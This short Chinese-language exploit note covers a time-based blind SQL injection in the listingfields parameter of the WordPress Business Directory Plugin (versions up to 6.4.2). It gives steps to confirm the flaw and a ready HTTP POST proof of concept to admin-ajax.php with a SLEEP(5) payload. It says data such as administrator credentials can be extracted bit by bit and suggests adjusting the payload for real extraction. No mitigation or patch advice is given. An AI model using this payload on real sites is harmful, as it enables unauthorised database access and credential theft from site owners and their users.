验证漏洞存在方法
    - 检查目标网站是否使用WordPress Business Directory Plugin
    - 检查插件版本是否≤6.4.2
    - 向包含listingfields参数的端点发送带有时间延迟payload的请求，观察响应时间是否显著增加

漏洞利用方法
    - 该漏洞存在于Business Directory Plugin的listingfields参数中，由于对用户输入转义不足和SQL查询准备不充分
    - 攻击者可以通过构造特定的SQL注入payload来执行基于时间的盲注攻击
    - 通过时间延迟技术可以逐位提取数据库中的敏感信息，如管理员凭据、用户数据等
    
PoC示例：
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

action=wpbdp_ajax&action2=search&listingfields[0][key]=1&listingfields[0][value]=1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
```

注意：这是一个基于时间的SQL注入漏洞，可以通过观察响应时间是否延迟5秒来判断漏洞是否存在。实际利用时可能需要调整payload来提取具体数据。
